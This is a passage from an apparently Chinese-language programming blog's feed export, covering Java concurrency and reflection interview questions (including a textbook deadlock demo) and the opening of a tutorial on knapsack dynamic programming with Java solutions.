class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReentrantLock lock =newReentrantLock(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>如果参数为true表示为公平锁，为false为非公平锁。默认情况下，如果使用无参构造器，则是非公平锁。</p><p><strong>4.读写锁</strong></p><p>读写锁将对一个资源（比如文件）的访问分成了2个锁，一个读锁和一个写锁。</p><p>正因为有了读写锁，才使得多个线程之间的读操作不会发生冲突。</p><p>ReadWriteLock就是读写锁，它是一个接口，ReentrantReadWriteLock实现了这个接口。</p><p>可以通过readLock()获取读锁，通过writeLock()获取写锁。</p><h2><span id="java线程同步的方式有哪些">Java线程同步的方式有哪些</span></h2><ul><li><p>使用synchronized修饰的同步方法</p></li><li><p>使用同步代码块synchronize{}</p></li><li><p>使用volatile变量</p></li><li><p>使用ThreadLocal</p></li><li><p>使用重入锁实现线程同步</p></li></ul><h2><span id="什么是线程安全">什么是线程安全？</span></h2><p>线程安全是一个多线程环境下正确性的概念，也就是保证多线程环境下共享的、可修改的状态的正确性。<br>换句话说，如果状态不共享、不可修改，那么也就不存在线程安全问题。进而引出确保线程安全的两个方法</p><ul><li>封装：把对象内部状态隐藏、保护起来</li><li>不可变：比如final、immutable等</li></ul><p>线程安全需要确保几个基本特性：</p><ul><li>原子性：相关操作不会中途被其他线程干扰，一般通过同步机制实现</li><li>可见性：一个线程修改了某个共享变量，其状态能够被其他线程知晓。解释为将线程本地状态反映到主内存上去。volatile就是用来保证可见性的</li><li>有序性：保证线程内串行语义，避免指令重排</li></ul><h2><span id="java编写一个会导致死锁的程序">Java编写一个会导致死锁的程序？</span></h2><p>死锁现象描述：</p><p>线程A和线程B相互等待对方持有的锁导致程序无限死循环下去。</p><p>死锁的实现步骤：</p><p>（1）两个线程里面分别持有两个Object对象：lock1和lock2。这两个lock作为同步代码块的锁；</p><p>（2）线程1的run()方法中同步代码块先获取lock1的对象锁，Thread.sleep(xxx)，时间不需要太多，100毫秒差不多了，然后接着获取lock2的对象锁。这么做主要是为了防止线程1启动一下子就连续获得了lock1和lock2两个对象的对象锁</p><p>（3）线程2的run)(方法中同步代码块先获取lock2的对象锁，接着获取lock1的对象锁，当然这时lock1的对象锁已经被线程1锁持有，线程2肯定是要等待线程1释放lock1的对象锁的</p><p>这样，线程1″睡觉”睡完，线程2已经获取了lock2的对象锁了，线程1此时尝试获取lock2的对象锁，便被阻塞，此时一个死锁就形成了。</p><p>死锁的实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeadLockDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object lockA = <span class="keyword">new</span> Object();</span><br><span class="line">        Object lockB = <span class="keyword">new</span> Object();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                String name = Thread.currentThread().getName();</span><br><span class="line">                <span class="keyword">synchronized</span> (lockA) &#123;</span><br><span class="line">                    System.out.println(name + <span class="string">" got lockA,  want LockB"</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (lockB) &#123;</span><br><span class="line">                        System.out.println(name + <span class="string">" got lockB"</span>);</span><br><span class="line">                        System.out.println(name + <span class="string">": say Hello!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"线程-A"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                String name = Thread.currentThread().getName();</span><br><span class="line">                <span class="keyword">synchronized</span> (lockB) &#123;</span><br><span class="line">                    System.out.println(name + <span class="string">" got lockB, want LockA"</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">synchronized</span> (lockA) &#123;</span><br><span class="line">                        System.out.println(name + <span class="string">" got lockA"</span>);</span><br><span class="line">                        System.out.println(name + <span class="string">": say Hello!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"线程-B"</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：</p><p>线程-A got lockA, want LockB</p><p>线程-B got lockB, want LockA</p><h2><span id="简单介绍一下runnable和callable的区别和用法">简单介绍一下Runnable和Callable的区别和用法</span></h2><p>区别：</p><ol><li>Runnable执行方法是run(),Callable是call()</li><li>实现Runnable接口的任务线程无返回值；实现Callable接口的任务线程能返回执行结果</li><li>call方法可以抛出异常，run方法若有异常只能在内部消化</li></ol><p>Future提供了三种功能：</p><p>　　1）判断任务是否完成；</p><p>　　2）能够中断任务；</p><p>　　3）能够获取任务执行结果。</p><h2><span id="java有哪几种创建多线程的方式">Java有哪几种创建多线程的方式？</span></h2><ul><li>继承Thread类</li><li>实现Runnable接口</li><li>实现Callable接口通过FutureTask包装器来创建Thread线程</li><li>使用ExecutorService、Callable、Future实现有返回结果的多线程。</li></ul><h2><span id="cyclibarriar和countdownlatch有什么区别">CycliBarriar和CountdownLatch有什么区别?</span></h2><p>cyclibarriar 就是栅栏，顾名思义：就是一个拦截的装置。多个线程start后，在栅栏处阻塞住，一般定义栅栏的时候会定义有多少个线程。比如定义为4个，那么有三个线程到栅栏处，就阻塞住，如果没有第四个，就会一直阻塞，知道启动第四个线程到栅栏处，所有的线程开始全部进行工作。有点像赛马的例子。所有的赛马一个一个到起点，然后到齐了，在开始跑。</p><p>countdownlatch：初始化定义一个数字（整型），比如定义2，一个线程启动后在await处停止下来阻塞，调用一次countDown，会减一，知道countDown后变为0时的时候，线程才会继续进行工作，否则会一直阻塞。</p><h2><span id="线程池的作用有哪些">线程池的作用有哪些？</span></h2><p>线程池的作用： 在程序启动的时候就创建若干线程来响应处理，它们被称为线程池，里面的线程叫工作线程<br>第一：降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。<br>第二：提高响应速度。当任务到达时，任务可以不需要等到线程创建就能立即执行。<br>第三：提高线程的可管理性。</p><p>常用线程池：ExecutorService 是主要的实现类，其中常用的有</p><ol><li>Executors.newSingleThreadPool(),</li><li>newFixedThreadPool(),</li><li>newCachedTheadPool(), </li><li>newScheduledThreadPool()。</li></ol><h2><span id="java-反射机制的作用">Java 反射机制的作用</span></h2><p>java反射机制的作用:</p><p>（1）在运行时判断任意一个对象所属的类</p><p>（2）在运行时构造任意一个类的对象</p><p>（3）在运行时判断任意一个类所具有的成员变量和方法</p><p>（4）在运行时调用任意一个对象的方法</p><p>反射就是动态加载对象，并对对象进行剖析。在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能成为Java反射机制。</p><p><strong>优点：</strong><br>可以动态的创建对象和编译，最大限度发挥了java的灵活性。</p><p><strong>缺点：</strong><br>对性能有影响。使用反射基本上一种解释操作，告诉JVM我们要做什么并且满足我们的要求，这类操作总是慢于直接执行java代码。</p><h2><span id="反射机制有哪些优点和缺点">反射机制有哪些优点和缺点</span></h2><p><strong>1、优点：</strong></p><p>静态编译：</p><p>在编译时确定类型，绑定对象，即通过。</p><p>动态编译：</p><p>运行时确定类型，绑定对象。动态编译最大限度的发挥了java的灵活性，体现了多态的应用，有利于降低类之间的耦合性。</p><p>一句话，反射机制的优点就是可以实现动态创建对象和编译，体现出很大的灵活性，特别是在J2EE的开发中它的灵活性就表现的十分明显。比如，一个大型的软件，不可能一次就把把它设计的很完美，当这个程序编译后，发布了，当发现需要更新某些功能时，我们不可能要用户把以前的卸载，再重新安装新的版本，假如这样的话，这个软件肯定是没有多少人用的。采用静态的话，需要把整个程序重新编译一次才可以实现功能的更新，而采用反射机制的话，它就可以不用卸载，只需要在运行时才动态的创建和编译，就可以实现该功能。</p><p><strong>2、缺点：</strong></p><p>是对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于只直接执行相同的操作。</p><h2><span id="反射创建类实例的三种方式">反射创建类实例的三种方式</span></h2><p>1、通过一个全限类名创建一个对象 </p><p>（1） Class.forName(“全限类名”); 例如：com.mysql.jdbc.Driver Driver类已经被加载到 jvm中，并且完成了类的初始化工作就行了 </p><p>（2）类名.class; 获取Class&lt;？&gt; clz 对象  </p><p>（3）对象.getClass(); </p><p>2、 获取构造器对象，通过构造器new出一个对象   </p><p>（1）Clazz.getConstructor([String.class]);   </p><p>（2）Con.newInstance([参数]);</p><p>3、通过class对象创建一个实例对象（就相当与new类名（）无参构造器)   </p><p>1）Clazz.newInstance();</p><h2><span id="jdk自带了哪些注解有什么作用">jdk自带了哪些注解，有什么作用</span></h2><p>@Overried</p><p>告诉编译器要检查该方法是重写父类的方法</p><p>@Deprecated</p><p>标记某个类或方法等已经废弃，不推荐使用，保留仅为兼容以前的程序</p><p>@SuppressWarnings</p><p>抑制编译器警告</p><p>@SafeVarargs</p><p>@FunctionalInterface</p><p>用来指定该接口是函数式接口</p><p>元注解位于JDK的java.lang.annotation包下：</p><p>1、@Retention</p><p>定义注解的保留策略，包括以下3种策略：</p><p>@Retention(RetentionPolicy.SOURCE)  //注解仅存在于源码中，在class字节码文件中不包含<br>@Retention(RetentionPolicy.CLASS)   // 默认的保留策略，注解会在class字节码文件中存在，但运行时无法获得，<br>@Retention(RetentionPolicy.RUNTIME) // 注解会在class字节码文件中存在，在运行时可以通过反射获取到</p><p>2、@Target</p><p>定义注解的使用对象，注解可以用在类上、方法上、属性上等，由ElementType枚举类定义：</p><p>3、@Inherited</p><p>子类可以继承父类中的注解</p><p>4、@Documented</p><p>javadoc工具会使用该注解生成文档</p><h2><span id="构造器constructor是否可被重写override">构造器（constructor）是否可被重写（override）</span></h2><p>构造器不能被继承，因此不能被重写，但可以被重载。</p><h2><span id="两个对象值相同xequalsy-true但却可有不同的hash-code这句话对不对">两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，这句话对不对？</span></h2><p>不对，如果两个对象x和y满足x.equals(y) == true，它们的哈希码（hash code）应当相同。Java对于eqauls方法和hashCode方法是这样规定的：(1)如果两个对象相同（equals方法返回true），那么它们的hashCode值一定要相同；(2)如果两个对象的hashCode相同，它们并不一定相同。当然，你未必要按照要求去做，但是如果你违背了上述原则就会发现在使用容器时，相同的对象可以出现在Set集合中，同时增加新元素的效率会大大下降（对于使用哈希存储的系统，如果哈希码频繁的冲突将会造成存取性能急剧下降）。</p><p>补充：关于equals和hashCode方法，很多Java程序都知道，但很多人也就是仅仅知道而已，在Joshua Bloch的大作《Effective Java》（很多软件公司，《Effective Java》、《Java编程思想》以及《重构：改善既有代码质量》是Java程序员必看书籍，如果你还没看过，那就赶紧去亚马逊买一本吧）中是这样介绍equals方法的：首先equals方法必须满足自反性（x.equals(x)必须返回true）、对称性（x.equals(y)返回true时，y.equals(x)也必须返回true）、传递性（x.equals(y)和y.equals(z)都返回true时，x.equals(z)也必须返回true）和一致性（当x和y引用的对象信息没有被修改时，多次调用x.equals(y)应该得到同样的返回值），而且对于任何非null值的引用x，x.equals(null)必须返回false。实现高质量的equals方法的诀窍包括：1. 使用==操作符检查”参数是否为这个对象的引用”；2. 使用instanceof操作符检查”参数是否为正确的类型”；3. 对于类中的关键属性，检查参数传入对象的属性是否与之相匹配；4. 编写完equals方法后，问自己它是否满足对称性、传递性、一致性；5. 重写equals时总是要重写hashCode；6. 不要将equals方法参数中的Object对象替换为其他的类型，在重写时不要忘掉@Override注解。</p><h2><span id="char-型变量中能不能存贮一个中文汉字为什么">char 型变量中能不能存贮一个中文汉字，为什么？</span></h2><p>char类型可以存储一个中文汉字，因为Java中使用的编码是Unicode（不选择任何特定的编码，直接使用字符在字符集中的编号，这是统一的唯一方法），一个char类型占2个字节（16比特），所以放一个中文是没问题的。</p><p>补充：使用Unicode意味着字符在JVM内部和外部有不同的表现形式，在JVM内部都是Unicode，当这个字符被从JVM内部转移到外部时（例如存入文件系统中），需要进行编码转换。所以Java中有字节流和字符流，以及在字符流和字节流之间进行转换的转换流，如InputStreamReader和OutputStreamReader，这两个类是字节流和字符流之间的适配器类，承担了编码转换的任务；对于C程序员来说，要完成这样的编码转换恐怕要依赖于union（联合体/共用体）共享内存的特征来实现了。</p><h2><span id="介绍一下g1垃圾回收集器的特点及垃圾回收过程">介绍一下G1垃圾回收集器的特点，及垃圾回收过程</span></h2><p>G1：是一款面向服务端应用的垃圾收集器</p><p>特点：</p><p>1、并行和并发：G1能充分利用CPU、多核环境下的硬件优势，使用多个CPU（CPU或者CPU核心）来缩短stop-The-World停顿时间。部分其他收集器原本需要停顿Java线程执行的GC动作，G1收集器仍然可以通过并发的方式让java程序继续执行。</p><p>2、分代收集：分代概念在G1中依然得以保留。虽然G1可以不需要其它收集器配合就能独立管理整个GC堆，但它能够采用不同的方式去处理新创建的对象和已经存活了一段时间、熬过多次GC的旧对象以获取更好的收集效果。也就是说G1可以自己管理新生代和老年代了。</p><p>3、空间整合：由于G1使用了独立区域（Region）概念，G1从整体来看是基于“标记-整理”算法实现收集，从局部（两个Region）上来看是基于“复制”算法实现的，但无论如何，这两种算法都意味着G1运作期间不会产生内存空间碎片。</p><p>4、可预测的停顿：这是G1相对于CMS的另一大优势，降低停顿时间是G1和CMS共同的关注点，但G1除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用这明确指定一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒。</p><p>与其它收集器相比，G1变化较大的是它将整个Java堆划分为多个大小相等的独立区域（Region），虽然还保留了新生代和来年代的概念，但新生代和老年代不再是物理隔离的了它们都是一部分Region（不需要连续）的集合。同时，为了避免全堆扫描，G1使用了Remembered Set来管理相关的对象引用信息。当进行内存回收时，在GC根节点的枚举范围中加入Remembered Set即可保证不对全堆扫描也不会有遗漏了。</p><p>如果不计算维护Remembered Set的操作，G1收集器的运作大致可划分为以下几个步骤：</p><p>1、初始标记（Initial Making）</p><p>2、并发标记（Concurrent Marking）</p><p>3、最终标记（Final Marking）</p><p>4、筛选回收（Live Data Counting and Evacuation）</p><p>看上去跟CMS收集器的运作过程有几分相似，不过确实也这样。初始阶段仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS（Next Top Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可以用的Region中创建新对象，这个阶段需要停顿线程，但耗时很短。并发标记阶段是从GC Roots开始对堆中对象进行可达性分析，找出存活对象，这一阶段耗时较长但能与用户线程并发运行。而最终标记阶段需要吧Remembered Set Logs的数据合并到Remembered Set中，这阶段需要停顿线程，但可并行执行。最后筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间来制定回收计划，这一过程同样是需要停顿线程的，但Sun公司透露这个阶段其实也可以做到并发，但考虑到停顿线程将大幅度提高收集效率，所以选择停顿。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划之背包问题</title>
      <link href="/2020/03/23/knap/"/>
      <url>/2020/03/23/knap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>尽可能详细的讲清楚背包问题，以及我所踩过的坑。</p><p>背包问题看本文就够了，一共6题。</p><a id="more"></a><!-- toc --><ul><li><a href="#入门样例">入门样例</a></li><li><a href="#01背包问题">01背包问题</a></li><li><a href="#完全背包问题">完全背包问题</a></li><li><a href="#凑数问题">凑数问题</a></li><li><a href="#leetcode-518-coin-change2">Leetcode 518 Coin Change2</a></li><li><a href="#多重背包问题">多重背包问题</a></li><li><a href="#494-target-sum">494. Target Sum</a></li><li><a href="#377-combination-sum-iv">377. Combination Sum IV</a></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><p>首先我们先来看一道零钱凑整问题：</p><h2><span id="入门样例">入门样例</span></h2><p>•给定面值分别为1,4,16,64的硬币，每种硬币有无限个，给定一个N，求组成N最少需要的硬币的数量，若无法组成则返回-1.</p><p>注意，这题中的硬币都是2的n次方，（前一个数是后一个数的两倍或以上）因此可以使用贪心算法。</p><p>贪心算法和动态规划的关系就是可以用贪心算法做的题一定可以用动态规划做出来，但是能用动态规划做出来的题不一定能用贪心算法做出来。</p><p>这里上一张贪心和动态规划的图：</p><p><img src="image-20200324092356133.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">coins</span><span class="params">(<span class="keyword">int</span> N)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[] val=&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">64</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=val.length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(N&gt;=val[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> n = N/val[i];</span><br><span class="line">            cnt+=n;</span><br><span class="line">            N=N%val[i];</span><br><span class="line">            <span class="keyword">if</span> (N==<span class="number">0</span>) <span class="keyword">return</span> cnt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>反例</strong>：假设给的硬币面值为1，9，10。要求去凑18元。</p><p>贪心的解应该是取1个10和8个1答案是9，但是正确答案其实是取2个9。</p><p><strong>先将零钱凑整问题放一放，来看下面一道题</strong></p><h2><span id="01背包问题">01背包问题</span></h2><p>给定n件物品，第i件物品的价值为v[i]，体积为w[i]，现在我们拥有一个容量为V的背包。</p><p>求能获得的最大价值，不一定装满。</p><br><p>在回答问题之前，先解释一下什么是01背包问题：<strong>即对于每件物品来说我们要么拿要么不拿，每件物品要么拿1件要么拿0件。</strong></p><p>了解完定义之后我们开始解这道题：</p><p>还是老方法解动态规划问题三部曲：</p><ol><li><p>下定义  </p><p>首先求什么我们定义什么。我们定义dp[i][j]为轮到第i件物品且背包还剩下j单位空间时所得到的最大价值。</p></li><li><p>写递推式</p><p>我们知道，在轮到第i件物品的时候我们可以选择拿或者不拿，那么此时的价值dp[i][j]就要么是拿了第i件物品，或者不拿第i件物品时的最大价值即：</p></li></ol><p>   $$<br>    dp[i][j]=Max(dp[i-1][j],dp[i-1][j-w[i]]+v[i])<br>   $$<br>   <br></p><ol start="3"><li><p>考虑初始条件</p><p>本题不需要考虑特殊初始条件</p></li></ol><p>技巧：有时候DP需要初始化第一行或者第一列，因为有时候数组下标可能越界，技巧就是多申请一行或者一列空间，并初始化为0，这样可以依靠这第0行来初始化第一行的值。例如第一行值依靠递推式取决于上一行的值。</p><p>以背包容量为10，物品大小和价值分别是A{3,4}，B{4,5}，C{5,6}。模拟走一遍流程：</p><p><img src="image-20200324095911869.png" alt></p><p>其实我们可以从递推式看出，当商品i为0的时候递推式变成了</p><p>dp[0][j]=Max(dp[-1][j],dp[-1][j-w[0]]+v[0])，因此我们新建了一行0来保证数组不越界，但是此时第i件物品还是从0开始到n-1，而dp的i已经变成1到n了。</p><p>因此递推式会有一点小小变化：</p><p>当j&gt;=w[i]时<br>$$<br>dp[i][j]=Max(dp[i-1][j],dp[i-1][j-w[i-1]]+v[i-1])<br>$$<br>else<br>$$<br>dp[i][j]=dp[i-1][j]<br>$$</p><p>即dp[1]对应物品w[0]和v[0]，一开始看会有点别扭，做多了就习惯了。</p><p>所以给出解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knapsack</span><span class="params">(<span class="keyword">int</span>[] v,<span class="keyword">int</span>[] w,<span class="keyword">int</span> V)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[v.length+<span class="number">1</span>][V+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;v.length+<span class="number">1</span> ; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;V+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(w[i-<span class="number">1</span>]&lt;=j)</span><br><span class="line">                    dp[i][j]=Math.max(dp[i-<span class="number">1</span>][j],dp[i-<span class="number">1</span>][j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[v.length][V];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> w[] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> v[] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">12</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>&#125;;</span><br><span class="line">        System.out.println(knapsack(v,w,<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，dp[i][]只是依赖到了dp[i-1][]，所以依然可以去优化。</p><p>因为是二维的dp，我们就可以根据递推式得到dp[i][j]总是依赖于上一行的dp[i-1][j]以及dp[i-1][j-w[i]]，而之前说过滚动数组，因此我们可以使用一维dp来代替二维dp。</p><p>当j&gt;=w[i]时<br>$$<br>dp[j]=Math.max(dp[j],dp[j-w[i]]+v[i]);<br>$$<br>else<br>$$<br>dp[j]=dp[j]<br>$$<br>并且由于新建的数字默认填充0，因此我们都不需要新开一行数据，或者换句话说不需要初始化数组。</p><p>但是值得注意的是当我们计算dp[j]的时候要依赖于上一行的dp[j]（在这里没毛病，因为计算dp[j]的时候在dp数组中j这个位置保存的还是上一行的值）和dp[j-w[i]]（这就有问题了，假设w[i]为1，那么dp[j]依赖于上一行的dp[j-1]，这在二维的dp里面是没毛病的，但一维dp中我们在计算dp[j]的时候其实已经将dp[j-1]也更新过了，不再是上一行的值，而是当前行的值，因此就会出问题）。</p><p><img src="image-20200324102413012.png" alt></p><p>假设我们更新b5的值，b5=a5+b4。由于此时b5==a5，因此可以通过b5=b5+b4来做到，去掉a这一行。</p><p>相对于是将二维转一维。</p><p>但是如果b5=a3+x，由于a3已经被覆盖成b3因此我们拿不到。所以需要反向遍历, 保证之前的值没有被覆盖过</p><p><img src="abcd.jpg" alt></p><p>解决方案是什么呢？其实就是我们遍历数组的时候使用倒序的方法，即先遍历dp[j]再遍历dp[j-1]，因为dp[j-1]不依赖于数组下标大于j-1的位置的值，因此可以做到。</p><p>下面给出逐步优化的过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knaps2</span><span class="params">(<span class="keyword">int</span>[] v, <span class="keyword">int</span>[] w, <span class="keyword">int</span> V)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[V + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; v.length + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = V; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们注意到i是从1开始的，但是递推式里面并没有i的值，因此我们还可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knaps1</span><span class="params">(<span class="keyword">int</span>[] v, <span class="keyword">int</span>[] w, <span class="keyword">int</span> V)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[V + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = V; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w[i])&#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-w[i]]+v[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 